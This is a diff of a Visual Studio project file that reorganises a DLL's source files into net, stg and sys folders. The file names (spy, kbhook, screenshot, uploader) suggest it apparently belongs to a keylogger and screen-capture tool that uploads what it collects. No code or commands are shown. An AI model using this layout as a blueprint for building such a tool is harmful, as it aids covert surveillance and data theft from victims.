@@ -18,6 +18,39 @@
       <Platform>x64</Platform>
     </ProjectConfiguration>
   </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="..\..\log-cpp\log.h" />
+    <ClInclude Include="cfg.h" />
+    <ClInclude Include="dllmain.h" />
+    <ClInclude Include="net\networking.h" />
+    <ClInclude Include="net\socket.h" />
+    <ClInclude Include="net\uploader.h" />
+    <ClInclude Include="spy.h" />
+    <ClInclude Include="stg\dir.h" />
+    <ClInclude Include="stg\kbhfile.h" />
+    <ClInclude Include="stg\scrotfile.h" />
+    <ClInclude Include="stg\storable.h" />
+    <ClInclude Include="stg\storage.h" />
+    <ClInclude Include="sys\kbhook.h" />
+    <ClInclude Include="sys\screenshot.h" />
+    <ClInclude Include="sys\timer.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="..\..\log-cpp\log.cpp" />
+    <ClCompile Include="dllmain.cpp" />
+    <ClCompile Include="net\networking.cpp" />
+    <ClCompile Include="net\socket.cpp" />
+    <ClCompile Include="net\uploader.cpp" />
+    <ClCompile Include="spy.cpp" />
+    <ClCompile Include="stg\dir.cpp" />
+    <ClCompile Include="stg\kbhfile.cpp" />
+    <ClCompile Include="stg\scrotfile.cpp" />
+    <ClCompile Include="stg\storable.cpp" />
+    <ClCompile Include="stg\storage.cpp" />
+    <ClCompile Include="sys\kbhook.cpp" />
+    <ClCompile Include="sys\screenshot.cpp" />
+    <ClCompile Include="sys\timer.cpp" />
+  </ItemGroup>
   <PropertyGroup Label="Globals">
     <ProjectGuid>{CF4B9068-696E-4C76-B72A-7940A2B184C0}</ProjectGuid>
     <Keyword>Win32Proj</Keyword>
@@ -142,39 +175,6 @@
       <OptimizeReferences>true</OptimizeReferences>
     </Link>
   </ItemDefinitionGroup>
-  <ItemGroup>
-    <ClCompile Include="..\..\log-cpp\log.cpp" />
-    <ClCompile Include="dir.cpp" />
-    <ClCompile Include="dllmain.cpp" />
-    <ClCompile Include="kbhfile.cpp" />
-    <ClCompile Include="networking.cpp" />
-    <ClCompile Include="screenshot.cpp" />
-    <ClCompile Include="scrotfile.cpp" />
-    <ClCompile Include="socket.cpp" />
-    <ClCompile Include="spy.cpp" />
-    <ClCompile Include="storable.cpp" />
-    <ClCompile Include="kbhook.cpp" />
-    <ClCompile Include="storage.cpp" />
-    <ClCompile Include="timer.cpp" />
-    <ClCompile Include="uploader.cpp" />
-  </ItemGroup>
-  <ItemGroup>
-    <ClInclude Include="..\..\log-cpp\log.h" />
-    <ClInclude Include="cfg.h" />
-    <ClInclude Include="dir.h" />
-    <ClInclude Include="dllmain.h" />
-    <ClInclude Include="kbhfile.h" />
-    <ClInclude Include="networking.h" />
-    <ClInclude Include="screenshot.h" />
-    <ClInclude Include="scrotfile.h" />
-    <ClInclude Include="socket.h" />
-    <ClInclude Include="storable.h" />
-    <ClInclude Include="kbhook.h" />
-    <ClInclude Include="spy.h" />
-    <ClInclude Include="storage.h" />
-    <ClInclude Include="timer.h" />
-    <ClInclude Include="uploader.h" />
-  </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
   </ImportGroup>
